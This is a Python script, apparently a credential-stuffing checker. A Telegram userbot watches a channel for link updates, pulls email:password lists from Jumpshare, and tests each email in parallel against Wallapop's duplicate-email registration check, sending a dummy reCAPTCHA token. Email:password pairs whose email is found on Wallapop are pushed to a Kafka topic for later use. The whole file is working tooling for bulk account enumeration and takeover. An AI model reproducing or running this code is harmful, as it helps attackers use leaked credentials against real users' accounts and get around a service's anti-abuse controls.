import json
import os
import secrets
import string
import time
from concurrent.futures import ThreadPoolExecutor
import requests
from kafka.errors import KafkaError, NoBrokersAvailable
from pyrogram import Client, filters
import asyncio

from JumpShare.parse_base import get_last_jumpshare_link, parse_jumpshare_strings
from JumpShare.xuy import check_walla_duplicate_email, normalize_accounts
from kafka import KafkaProducer
from dotenv import load_dotenv

load_dotenv()

API_ID = int(os.getenv('TELEGRAM_API_ID'))
API_HASH = os.getenv('TELEGRAM_API_HASH')
PHONE_NUMBER = os.getenv('TELEGRAM_PHONE_NUMBER')
PASSWORD = os.getenv('TELEGRAM_PASSWORD')
CHAT_ID = int(os.getenv('TELEGRAM_CHAT_ID'))
RECIPIENT_ID = int(os.getenv('TELEGRAM_RECIPIENT_ID'))
MAX_WORKERS = int(os.getenv('MAX_WORKERS'))
TOPIC_NAME = os.getenv('TOPIC')

INPUT_FILE = "../wallapop-string-parser/1.txt"

app = Client(
    "my_account",
    api_id=API_ID,
    api_hash=API_HASH,
    phone_number=PHONE_NUMBER
)


class StopThreadException(Exception):
    pass


def generate_random_password(length=8):
    chars = string.digits
    return ''.join(secrets.choice(chars) for _ in range(length))


def create_producer_with_retry(max_retries=10, backoff_sec=2):
    attempt = 0
    kafka_broker = os.getenv("KAFKA_BROKER", "localhost:9092")
    while attempt < max_retries:
        try:
            producer = KafkaProducer(
                bootstrap_servers=kafka_broker,
                value_serializer=lambda v: v.encode('utf-8'),
                retries=5,
                request_timeout_ms=10000,
                metadata_max_age_ms=300000,
                # Добавьте эти параметры
                api_version=(2, 5, 0),
                acks='all'
            )
            print("Подключение к Kafka успешно!")
            return producer
        except NoBrokersAvailable as e:
            print(f"Попытка {attempt + 1}: No brokers available. Жду {backoff_sec} сек...")
            time.sleep(backoff_sec)
            backoff_sec *= 2
            attempt += 1
    raise Exception("Не удалось подключиться к Kafka после всех попыток")


# Глобальная переменная для producer
producer = None


def init_kafka_producer():
    global producer
    try:
        producer = create_producer_with_retry()
        print("Kafka producer инициализирован успешно")
    except Exception as e:
        print(f"Ошибка инициализации Kafka producer: {e}")
        producer = None


# Инициализируем producer при старте
init_kafka_producer()


def process_account(mail, password):
    global producer

    # Проверяем, инициализирован ли producer
    if producer is None:
        print("Kafka producer не инициализирован, пропускаем отправку")
        return

    try:
        isWallaRegistered = check_walla_duplicate_email(
            email=mail,
            password=generate_random_password(),
            username=generate_random_password(),
            recaptcha_token="1"
        )
        if isWallaRegistered is None:
            raise StopThreadException("Ошибка проверки email")

        print(f"{mail}: такая почта есть на валлапопе")
        message = f"{mail}:{password}"

        requests.post("http://localhost:8080/bot{}/start-cpatch", data={
            "flag": True,
        }),

        # Отправляем сообщение и ждем подтверждения
        future = producer.send(TOPIC_NAME, value=message)
        try:
            future.get(timeout=10)  # Ждем подтверждения отправки
            print(f"Успешно отправлено в Kafka: {message}")
        except KafkaError as ke:
            print(f"Ошибка отправки в Kafka для {mail}: {ke}")

    except StopThreadException as ste:
        print(f"StopThreadException при обработке {mail}: {ste}")

    except Exception as e:
        print(f"Exception при обработке {mail}: {e}")
        # При ошибках сети переинициализируем producer
        if "Network" in str(e) or "Broker" in str(e):
            producer = None


def worker(args):
    email, password = args
    try:
        process_account(mail=email, password=password)
    except TimeoutError:
        print(f"[TIMEOUT] {email} — exceeded time limit")
    except Exception as e:
        print(f"[ERROR] {email} — {e}")


@app.on_message(filters.chat(CHAT_ID))
async def handle_channel_message(client, message):
    if message.text:
        base_message1 = "New Link Update"
        base_message2 = "Link Update"
        base_message = None
        if message.text.startswith(base_message1):
            base_message = base_message1
        elif message.text.startswith(base_message2):
            base_message = base_message2
        else:
            print(f"сообщеие без base_message: {base_message1} | {base_message2}")
            return

        token = message.text[len(base_message):].strip()
        print(f"Найден токен: {token}")
        jumpshare_link = get_last_jumpshare_link()
        if not jumpshare_link:
            print("Не удалось получить jumpshare ссылку")
            return

        is_parsed = parse_jumpshare_strings(jumpshare_link, token)
        if not is_parsed:
            print("Не удалось распарсить строки")
            return

        await main()

    else:
        print(f"Новое сообщение без текста: {message}")


async def main():
    # Переинициализируем producer если нужно
    global producer
    if producer is None:
        init_kafka_producer()
        if producer is None:
            print("Не удалось инициализировать Kafka, пропускаем обработку")
            return

    accounts = []
    try:
        with open(f'{INPUT_FILE}', 'r', errors="replace") as f:
            accounts = f.readlines()
        if not accounts:
            raise Exception("Файл 1.txt пуст")
    except Exception as e:
        print(f"account upload error: {e}")
        return

    print(f'было загружено аккаунтов {len(accounts)}')
    accounts = normalize_accounts(accounts)
    print(f'Осталось аккаунтов {len(accounts)}')

    time_s = time.time()

    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        futures = []
        for email, password in accounts:
            future = executor.submit(worker, (email, password))
            futures.append(future)

        # Ждем завершения всех задач
        for future in futures:
            future.result()


    time_e = time.time()
    print(f"Working time: {time_e - time_s}")


if __name__ == "__main__":
    app.run()